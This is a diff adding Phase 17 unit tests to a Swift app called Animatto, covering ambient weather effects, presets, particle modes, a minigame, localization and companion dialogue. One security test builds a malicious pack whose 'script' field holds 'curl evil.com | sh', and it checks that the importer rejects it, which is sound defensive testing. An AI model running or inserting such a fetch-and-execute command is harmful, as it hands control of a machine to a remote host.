@@ -3535,12 +3535,283 @@ func testProfileStorageSafeFailureAndCorruptedPayloadRecovery() {
     }
 }
 
+// MARK: - Phase 17 Tests: Ambient Worlds and Weather-Reactive Companions
+
+func testAmbientEnvironmentTypesAndIcons() {
+    print("Running testAmbientEnvironmentTypesAndIcons...")
+    
+    let allTypes = AmbientEnvironmentType.allCases
+    TestHarness.assertEqual(allTypes.count, 6, message: "Exactly 6 ambient environment types supported")
+    
+    for env in allTypes {
+        TestHarness.assertTrue(!env.displayName.isEmpty, "Environment \(env.rawValue) has non-empty display name")
+        TestHarness.assertTrue(!env.iconName.isEmpty, "Environment \(env.rawValue) has valid SF Symbol icon")
+    }
+}
+
+func testAtmospherePresetsAndCustomPresetLifecycle() {
+    print("Running testAtmospherePresetsAndCustomPresetLifecycle...")
+    
+    // 1. Built-in presets count and attributes
+    let builtIns = AtmospherePreset.builtInPresets
+    TestHarness.assertEqual(builtIns.count, 6, message: "Exactly 6 built-in presets provided")
+    
+    let rainy = builtIns.first(where: { $0.presetKey == "rainy_evening" })
+    TestHarness.assertTrue(rainy != nil, "Rainy Evening preset present")
+    TestHarness.assertEqual(rainy?.environmentType, .rain, message: "Rainy evening is rain type")
+    TestHarness.assertTrue(rainy?.isBuiltIn == true, "Marked as built-in")
+    
+    // 2. Custom preset creation and range clamping
+    let engine = AmbientEngine.shared
+    engine.currentEnvironment = .fallingLeaves
+    engine.intensity = 1.8 // Out of bounds, should clamp
+    engine.windStrength = -2.5 // Out of bounds, should clamp
+    
+    let custom = engine.saveCustomPreset(name: "Windy Autumn")
+    TestHarness.assertEqual(custom.name, "Windy Autumn", message: "Custom preset saved with given name")
+    TestHarness.assertEqual(custom.environmentType, .fallingLeaves, message: "Custom preset captures current environment")
+    TestHarness.assertEqual(custom.intensity, 1.0, message: "Intensity clamped to maximum 1.0")
+    TestHarness.assertEqual(custom.windStrength, -1.0, message: "Wind clamped to minimum -1.0")
+    TestHarness.assertTrue(!custom.isBuiltIn, "Custom preset is not built-in")
+    
+    // 3. Custom preset deletion
+    engine.deleteCustomPreset(presetKey: custom.presetKey)
+    let found = engine.customPresets.contains(where: { $0.presetKey == custom.presetKey })
+    TestHarness.assertFalse(found, "Custom preset removed after deletion")
+}
+
+func testAmbientEngineParticleSimulationAndQualityModes() {
+    print("Running testAmbientEngineParticleSimulationAndQualityModes...")
+    
+    let engine = AmbientEngine.shared
+    engine.screenBoundsProvider = { CGRect(x: 0, y: 0, width: 1000, height: 800) }
+    engine.reducedMotionProvider = { false }
+    engine.currentEnvironment = .snow
+    engine.intensity = 1.0
+    engine.isPaused = false
+    engine.isEnabled = true
+    
+    // 1. Low Power Mode
+    engine.qualityMode = .lowPower
+    engine.rebuildParticles()
+    TestHarness.assertEqual(engine.qualityMode.maxParticles, 40, message: "Low power mode bounds particles to 40")
+    TestHarness.assertEqual(engine.activeParticles.count, 40, message: "Engine generates exactly 40 particles under low power")
+    
+    // 2. Balanced Mode
+    engine.qualityMode = .balanced
+    engine.rebuildParticles()
+    TestHarness.assertEqual(engine.qualityMode.maxParticles, 110, message: "Balanced mode bounds particles to 110")
+    TestHarness.assertEqual(engine.activeParticles.count, 110, message: "Engine generates 110 particles under balanced mode")
+    
+    // 3. High Quality Mode
+    engine.qualityMode = .highQuality
+    engine.rebuildParticles()
+    TestHarness.assertEqual(engine.qualityMode.maxParticles, 260, message: "High quality mode bounds particles to 260")
+    TestHarness.assertEqual(engine.activeParticles.count, 260, message: "Engine generates 260 particles under high quality")
+    
+    // 4. Tick boundary wrapping
+    let pBefore = engine.activeParticles.first
+    engine.tick()
+    let pAfter = engine.activeParticles.first
+    TestHarness.assertTrue(pBefore?.y != pAfter?.y, "Particle simulation tick updates particle position")
+    
+    // Clean up
+    engine.isEnabled = false
+}
+
+func testAmbientMinigameSpawningScoringAndPersistence() {
+    print("Running testAmbientMinigameSpawningScoringAndPersistence...")
+    
+    let game = AmbientMinigameManager.shared
+    game.spawnBoundsProvider = { CGRect(x: 0, y: 0, width: 800, height: 600) }
+    
+    // 1. Start Session
+    game.startSession()
+    TestHarness.assertTrue(game.isSessionActive, "Minigame session is marked active")
+    TestHarness.assertEqual(game.currentScore, 0, message: "Starting score is 0")
+    
+    // 2. Spawn Items
+    for _ in 0..<10 {
+        game.spawnCollectible()
+    }
+    TestHarness.assertTrue(game.activeItems.count <= game.maxActiveCollectibles, "Active items bounded by maxActiveCollectibles (6)")
+    
+    // 3. Collect Item with Points
+    if let item = game.activeItems.first {
+        let expectedPoints = item.rarity.pointValue
+        let collected = game.collect(itemWithId: item.id)
+        TestHarness.assertTrue(collected != nil, "Item successfully collected")
+        TestHarness.assertEqual(game.currentScore, expectedPoints, message: "Score increments by item rarity value: \(expectedPoints)")
+        TestHarness.assertEqual(game.sessionCollectiblesCount, 1, message: "Session collectibles count increments to 1")
+        
+        // 4. Prevent duplicate collection
+        let secondTry = game.collect(itemWithId: item.id)
+        TestHarness.assertTrue(secondTry == nil, "Duplicate collection of already-collected item returns nil")
+    }
+    
+    // 5. Stop Session
+    game.stopSession()
+    TestHarness.assertFalse(game.isSessionActive, "Minigame session marked inactive after stop")
+    TestHarness.assertEqual(game.activeItems.count, 0, message: "All active collectibles cleared upon session stop")
+}
+
+func testWeatherConditionMappingAndInverseWeatherMode() {
+    print("Running testWeatherConditionMappingAndInverseWeatherMode...")
+    
+    // 1. WMO Code Rain Mapping
+    let rainCond = WeatherCondition(temperatureCelsius: 14.0, weatherCode: 61, windSpeedKmh: 12.0, conditionDescription: "Rain")
+    TestHarness.assertEqual(rainCond.mappedEnvironment, .rain, message: "Weather code 61 maps to Rain")
+    
+    // 2. Inverse Mode: Rain -> Sunlight
+    TestHarness.assertEqual(rainCond.inverseEnvironment, .sunlight, message: "Inverse mode maps Rain to Golden Sunlight")
+    
+    // 3. WMO Code Snow Mapping
+    let snowCond = WeatherCondition(temperatureCelsius: -2.0, weatherCode: 71, windSpeedKmh: 8.0, conditionDescription: "Snow")
+    TestHarness.assertEqual(snowCond.mappedEnvironment, .snow, message: "Weather code 71 maps to Snow")
+    
+    // 4. Inverse Mode: Snow -> Falling Leaves
+    TestHarness.assertEqual(snowCond.inverseEnvironment, .fallingLeaves, message: "Inverse mode maps Snow to Autumn Leaves")
+    
+    // 5. WMO Code Fog Mapping
+    let fogCond = WeatherCondition(temperatureCelsius: 9.0, weatherCode: 45, windSpeedKmh: 5.0, conditionDescription: "Fog")
+    TestHarness.assertEqual(fogCond.mappedEnvironment, .fog, message: "Weather code 45 maps to Fog")
+    TestHarness.assertEqual(fogCond.inverseEnvironment, .sunlight, message: "Inverse mode maps Fog to Sunlight")
+    
+    // 6. WMO Clear Mapping & Inverse
+    let clearCond = WeatherCondition(temperatureCelsius: 22.0, weatherCode: 0, windSpeedKmh: 10.0, conditionDescription: "Clear")
+    TestHarness.assertEqual(clearCond.mappedEnvironment, .sunlight, message: "Weather code 0 maps to Sunlight")
+    TestHarness.assertEqual(clearCond.inverseEnvironment, .rain, message: "Inverse mode maps Sunlight to Rain")
+}
+
+func testAtmospherePackImportValidationAndSecurityRejection() {
+    print("Running testAtmospherePackImportValidationAndSecurityRejection...")
+    
+    let service = AtmospherePackService.shared
+    
+    // 1. Valid Pack Export & Import Round-Trip
+    let preset = AtmospherePreset(presetKey: "cyber_mist", name: "Cyber Mist", environmentType: .fog, intensity: 0.8)
+    let validPack = AtmospherePack(
+        schemaVersion: 1,
+        packId: "pack_cyber_1",
+        name: "Cyber Moods",
+        author: "NeoArtist",
+        license: "MIT",
+        presets: [preset]
+    )
+    
+    let exportResult = service.exportPackJSON(validPack)
+    switch exportResult {
+    case .success(let data):
+        let importResult = service.importPack(from: data)
+        switch importResult {
+        case .success(let imported):
+            TestHarness.assertEqual(imported.packId, "pack_cyber_1", message: "Valid pack imported successfully")
+            TestHarness.assertEqual(imported.presets.count, 1, message: "Preset imported from pack")
+        case .failure(let err):
+            TestHarness.assertTrue(false, "Valid pack import failed: \(err)")
+        }
+    case .failure(let err):
+        TestHarness.assertTrue(false, "Pack export failed: \(err)")
+    }
+    
+    // 2. Security Rejection: Forbidden script/executable keys
+    let maliciousPayload: [String: Any] = [
+        "schemaVersion": 1,
+        "packId": "malicious_pack",
+        "name": "Hacked Pack",
+        "author": "Attacker",
+        "license": "MIT",
+        "script": "curl evil.com | sh",
+        "presets": [
+            ["presetKey": "evil_rain", "name": "Evil Rain", "environmentType": "rain", "intensity": 0.5, "windStrength": 0.0, "qualityMode": "balanced", "companionReactionsAllowed": true, "isBuiltIn": false]
+        ]
+    ]
+    
+    if let malData = try? JSONSerialization.data(withJSONObject: maliciousPayload) {
+        let malResult = service.importPack(from: malData)
+        switch malResult {
+        case .success:
+            TestHarness.assertTrue(false, "Packs containing executable script keys must be rejected")
+        case .failure(let err):
+            TestHarness.assertTrue(err.errorDescription?.contains("Security check failed") == true, "Security check explicitly rejects forbidden script key: \(err)")
+        }
+    }
+}
+
+func testAmbientLocalization11LanguagesCoverage() {
+    print("Running testAmbientLocalization11LanguagesCoverage...")
+    
+    let languages = AmbientLanguage.allCases
+    TestHarness.assertEqual(languages.count, 11, message: "Exactly 11 languages supported")
+    
+    let testKeys = ["env.rain", "env.snow", "preset.rainy_evening", "ui.ambience_title", "ui.minigame_title"]
+    
+    for lang in languages {
+        for key in testKeys {
+            let translation = AmbientLocalization.localized(key, language: lang)
+            TestHarness.assertTrue(!translation.isEmpty, "Language \(lang.displayName) provides translation for \(key)")
+            TestHarness.assertTrue(translation != key, "Translation for \(key) in \(lang.displayName) is not a raw key fallback")
+        }
+    }
+    
+    // Fallback test
+    let unknownFallback = AmbientLocalization.localized("unknown.key.never.exists", language: .hindi)
+    TestHarness.assertEqual(unknownFallback, "unknown.key.never.exists", message: "Unknown keys fall back gracefully to the raw key")
+}
+
+func testWeatherDialogueTriggerAndCompanionReactions() {
+    print("Running testWeatherDialogueTriggerAndCompanionReactions...")
+    
+    DialogueCooldownManager.shared.resetAll()
+    let sleepyProfile = PersonalityProfile.preset(.sleepy)
+    let energeticProfile = PersonalityProfile.preset(.energetic)
+    
+    let sleepyEngine = DialogueEngine(characterId: UUID(), characterName: "SleepyPet", profile: DialogueProfile.fromPersonality(sleepyProfile))
+    let energeticEngine = DialogueEngine(characterId: UUID(), characterName: "EnergeticPet", profile: DialogueProfile.fromPersonality(energeticProfile))
+    let fixedNow = Date()
+    
+    // 1. Rain dialogue reaction for Sleepy
+    let rainLine = sleepyEngine.evaluateTrigger(
+        .ambientWeather(type: .rain),
+        personality: sleepyProfile,
+        needs: CharacterNeeds(),
+        currentAction: .idle,
+        referenceDate: fixedNow
+    )
+    TestHarness.assertTrue(rainLine != nil, "Sleepy companion responds to gentle rain")
+    TestHarness.assertTrue(rainLine?.text.contains("rain") == true, "Dialogue references rain: \(rainLine?.text ?? "")")
+    
+    // 2. Sunlight dialogue reaction for Energetic
+    DialogueCooldownManager.shared.resetAll()
+    let sunLine = energeticEngine.evaluateTrigger(
+        .ambientWeather(type: .sunlight),
+        personality: energeticProfile,
+        needs: CharacterNeeds(),
+        currentAction: .walking,
+        referenceDate: fixedNow
+    )
+    TestHarness.assertTrue(sunLine != nil, "Energetic companion responds to sunlight")
+    TestHarness.assertTrue(sunLine?.text.contains("sun") == true, "Dialogue references sun: \(sunLine?.text ?? "")")
+    
+    // 3. Collectible capture reaction
+    DialogueCooldownManager.shared.resetAll()
+    let collectLine = energeticEngine.evaluateTrigger(
+        .collectibleCaptured(name: "Starlight Crystal", points: 100),
+        personality: energeticProfile,
+        needs: CharacterNeeds(),
+        currentAction: .idle,
+        referenceDate: fixedNow
+    )
+    TestHarness.assertTrue(collectLine != nil, "Companion reacts to collectible capture")
+    TestHarness.assertTrue(collectLine?.text.contains("Starlight Crystal") == true, "Capture dialogue mentions collectible name: \(collectLine?.text ?? "")")
+}
+
 // MARK: - Main Entry Point
 
 @main
 struct TestRunner {
     static func main() {
-        print("=== STARTING ANIMATTO PHASE 1 THROUGH PHASE 16 UNIT TESTS ===")
+        print("=== STARTING ANIMATTO PHASE 1 THROUGH PHASE 17 UNIT TESTS ===")
         // Ensure clean productivity manager singleton state
         ProductivityTimerManager.shared.stop()
         ProductivityTimerManager.shared.clearPersistedState()
@@ -3671,6 +3942,16 @@ struct TestRunner {
         testCloudAndLocalAIFailureAndFallbackBehavior()
         testProfileStorageSafeFailureAndCorruptedPayloadRecovery()
 
+        // Phase 17 tests: Ambient Worlds & Weather-Reactive Companions
+        testAmbientEnvironmentTypesAndIcons()
+        testAtmospherePresetsAndCustomPresetLifecycle()
+        testAmbientEngineParticleSimulationAndQualityModes()
+        testAmbientMinigameSpawningScoringAndPersistence()
+        testWeatherConditionMappingAndInverseWeatherMode()
+        testAtmospherePackImportValidationAndSecurityRejection()
+        testAmbientLocalization11LanguagesCoverage()
+        testWeatherDialogueTriggerAndCompanionReactions()
+
         print("\n================ TEST RESULTS ================")
         print("Passed: \(TestHarness.passedCount) assertion(s)")
         print("Failed: \(TestHarness.failedCount) failure(s)")
@@ -3680,7 +3961,7 @@ struct TestRunner {
             print("❌ Test suite failed!")
             exit(1)
         } else {
-            print("🎉 All Animatto Phase 1 through Phase 16 unit tests passed successfully!")
+            print("🎉 All Animatto Phase 1 through Phase 17 unit tests passed successfully!")
             exit(0)
         }
     }
